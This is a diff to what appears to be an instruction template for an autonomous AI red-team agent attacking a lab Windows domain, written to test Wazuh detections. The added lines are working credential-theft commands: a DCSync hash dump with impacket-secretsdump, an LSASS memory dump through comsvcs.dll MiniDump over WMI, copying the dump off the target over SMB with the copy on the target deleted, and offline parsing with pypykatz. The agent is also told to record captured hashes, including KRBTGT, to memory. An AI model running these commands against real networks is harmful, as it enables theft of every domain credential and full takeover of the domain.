@@ -24,8 +24,15 @@ ADMIN_PASS=$(jq -r '.cracked[] | select(.user == "'"$ADMIN_USER"'") | .password'
 
 # DCSync -- request all domain hashes from DC
 impacket-secretsdump {{domain}}/"$ADMIN_USER":"$ADMIN_PASS"@{{dc}} \
-  -just-dc 2>&1 | head -50
+  -just-dc -outputfile "{{logDir}}/dcsync_output" 2>&1 | head -50
 ```
+
+**Validation (MANDATORY):** Verify DCSync output files exist before logging success:
+```bash
+ls -la {{logDir}}/dcsync_output.txt* 2>&1
+wc -l {{logDir}}/dcsync_output.ntds 2>&1
+```
+If the files do not exist or are empty, DCSync FAILED. Do NOT log success without file validation.
 
 Expected Wazuh rule: **100140** (level 14) -- DCSync detected
 This is a CRITICAL detection that WILL trigger SOAR response.
@@ -57,9 +64,57 @@ impacket-wmiexec {{domain}}/"$ADMIN_USER":"$ADMIN_PASS"@172.16.20.103 \
 
 Expected Wazuh rule: **100162** (level 12) -- PowerShell modifies Defender
 
+## Attack 4: LSASS Credential Extraction (T1003.001)
+
+**OPSEC RULES (MANDATORY):**
+- Write dump to `C:\Windows\Temp` -- NEVER to web root (htdocs, wwwroot, inetpub)
+- Exfil via impacket-smbclient or evil-winrm download
+- Delete dump from target IMMEDIATELY after exfil
+- Parse locally on Kali with pypykatz
+- Log extracted creds to session memory
+
+```bash
+# Step 1: Dump LSASS on target (write to safe path)
+impacket-wmiexec {{domain}}/"$ADMIN_USER":"$ADMIN_PASS"@172.16.20.103 \
+  'powershell -c "rundll32 C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\debug.dmp full"' 2>&1
+
+# Step 2: Exfil dump via SMB
+impacket-smbclient {{domain}}/"$ADMIN_USER":"$ADMIN_PASS"@172.16.20.103 <<SMBEOF
+use C$
+cd Windows\Temp
+get debug.dmp {{logDir}}/lsass.dmp
+del debug.dmp
+exit
+SMBEOF
+
+# Step 3: Verify dump deleted from target
+impacket-wmiexec {{domain}}/"$ADMIN_USER":"$ADMIN_PASS"@172.16.20.103 \
+  'cmd /c dir C:\Windows\Temp\debug.dmp' 2>&1
+
+# Step 4: Parse locally with pypykatz
+pypykatz lsa minidump {{logDir}}/lsass.dmp 2>&1 | tee {{logDir}}/lsass_parsed.txt
+
+# Step 5: Log extracted creds to session memory
+# After parsing, call memory_append("session", "- LSASS creds: [user count] users extracted")
+```
+
+## Logging Protocol (MANDATORY)
+For every significant action, call `log_attack` TWICE:
+1. **Before execution**: result="skipped", details="STARTING: [what you're about to do]"
+2. **After result**: result="success"/"failed"/"blocked", details="RESULT: [what happened]"
+
+This ensures traceability even if the agent crashes mid-action.
+
 ## Output
 
 Log each with `log_attack`, save evidence to `{{logDir}}/privesc_evidence.md`.
+
+## MANDATORY: Save Progress After Every Step
+You MUST call `memory_write("privesc", ...)` after EACH attack step completes (DCSync, Golden Ticket, Defense Evasion), not just at the end. If your context is compressed mid-run, your work is lost otherwise.
+
+After DCSync specifically:
+1. Immediately call `memory_write("privesc", ...)` with all hashes captured
+2. Call `memory_append("session", "- DCSync complete: [hash count] hashes, KRBTGT: [hash]")`
 
 ## Memory Protocol
 
@@ -80,3 +135,11 @@ Log each with `log_attack`, save evidence to `{{logDir}}/privesc_evidence.md`.
 - After DCSync, the SOAR will likely block your IP -- document this as a detection success
 - If blocked, stop and log -- do not try to evade the SOAR response
 - This is the final attack phase before reporting
+
+## Proportionality Rules (MANDATORY)
+- NEVER delete files on the attacker machine (this Kali box)
+- NEVER wipe logs, evidence files, or attack artifacts
+- NEVER modify /etc/passwd, /etc/shadow, or SSH keys on attacker
+- NEVER run destructive commands (rm -rf, format, dd) on any machine
+- NEVER attempt denial of service against any target
+- If a command could cause permanent damage, SKIP it and log why
